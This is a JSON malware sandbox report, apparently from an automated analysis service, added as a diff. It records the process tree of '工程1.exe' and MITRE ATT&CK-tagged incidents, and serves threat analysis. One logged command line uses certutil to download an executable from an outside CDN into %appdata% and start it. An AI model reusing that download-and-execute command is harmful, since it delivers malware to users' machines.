@@ -1,0 +1,148 @@
+{
+ "Name": "工程1.exe",
+ "Md5": "8051f25dc3adc82b5b5041397a878a3c",
+ "UUID": "d4113b5e-762d-474a-9133-e894fb53f89a",
+ "Processes": [
+  {
+   "OID": "5ecc5cffb068c822e5aa3b62",
+   "ProcessID": 1392,
+   "ParentPID": 372,
+   "CommandLine": "\"C:\\Users\\admin\\AppData\\Local\\Temp\\工程1.exe\" ",
+   "Image": "C:\\Users\\admin\\AppData\\Local\\Temp\\工程1.exe",
+   "ProcessType": "Main process",
+   "CreationTimestamp": 1590451455189
+  },
+  {
+   "OID": "5ecc5cffb068c822e5aa3b84",
+   "ProcessID": 3884,
+   "ParentPID": 1392,
+   "CommandLine": "cmd.exe /c certutil.exe -urlcache -split -f https://attachments-cdn.shimo.im/plk477GnPrteRJ2k.exe %appdata%\\1.exe\u0026start %appdata%\\1.exe",
+   "Image": "C:\\Windows\\system32\\cmd.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1590451455282
+  },
+  {
+   "OID": "5ecc5cffb068c822e5aa3b86",
+   "ProcessID": 252,
+   "ParentPID": 3884,
+   "CommandLine": "certutil.exe  -urlcache -split -f https://attachments-cdn.shimo.im/plk477GnPrteRJ2k.exe C:\\Users\\admin\\AppData\\Roaming\\1.exe",
+   "Image": "C:\\Windows\\system32\\certutil.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1590451455423
+  },
+  {
+   "OID": "5ecc5d07b068c822e5aa4460",
+   "ProcessID": 3400,
+   "ParentPID": 3884,
+   "CommandLine": "C:\\Users\\admin\\AppData\\Roaming\\1.exe ",
+   "Image": "C:\\Users\\admin\\AppData\\Roaming\\1.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1590451462610
+  },
+  {
+   "OID": "5ecc5d0db068c822e5aa494c",
+   "ProcessID": 3244,
+   "ParentPID": 3400,
+   "CommandLine": "\"C:\\Users\\admin\\AppData\\Local\\tbs\\tbs.exe\"",
+   "Image": "C:\\Users\\admin\\AppData\\Local\\tbs\\tbs.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1590451468767
+  }
+ ],
+ "Incidents": [
+  {
+   "ProcessOID": "5ecc5d0db068c822e5aa494c",
+   "ThreatLevel": 2,
+   "MitreAttacks": [
+    "T1060"
+   ]
+  },
+  {
+   "ProcessOID": "5ecc5d0db068c822e5aa494c",
+   "ThreatLevel": 2,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5ecc5d0db068c822e5aa494c",
+   "ThreatLevel": 1,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5ecc5d0db068c822e5aa494c",
+   "ThreatLevel": 2,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5ecc5d0db068c822e5aa494c",
+   "ThreatLevel": 1,
+   "MitreAttacks": [
+    "T1012"
+   ]
+  },
+  {
+   "ProcessOID": "5ecc5d0db068c822e5aa494c",
+   "ThreatLevel": 2,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5ecc5d07b068c822e5aa4460",
+   "ThreatLevel": 2,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5ecc5d07b068c822e5aa4460",
+   "ThreatLevel": 1,
+   "MitreAttacks": [
+    "T1106"
+   ]
+  },
+  {
+   "ProcessOID": "5ecc5d07b068c822e5aa4460",
+   "ThreatLevel": 1,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5ecc5d07b068c822e5aa4460",
+   "ThreatLevel": 2,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5ecc5cffb068c822e5aa3b86",
+   "ThreatLevel": 1,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5ecc5cffb068c822e5aa346a",
+   "ThreatLevel": 1,
+   "MitreAttacks": [
+    "T1012"
+   ]
+  },
+  {
+   "ProcessOID": "5ecc5cffb068c822e5aa3b86",
+   "ThreatLevel": 1,
+   "MitreAttacks": [
+    "T1012"
+   ]
+  },
+  {
+   "ProcessOID": "5ecc5cffb068c822e5aa3b86",
+   "ThreatLevel": 1,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5ecc5cffb068c822e5aa3b84",
+   "ThreatLevel": 2,
+   "MitreAttacks": [
+    "T1105"
+   ]
+  },
+  {
+   "ProcessOID": "5ecc5cffb068c822e5aa3b62",
+   "ThreatLevel": 1,
+   "MitreAttacks": [
+    "T1059"
+   ]
+  }
+ ]
+}
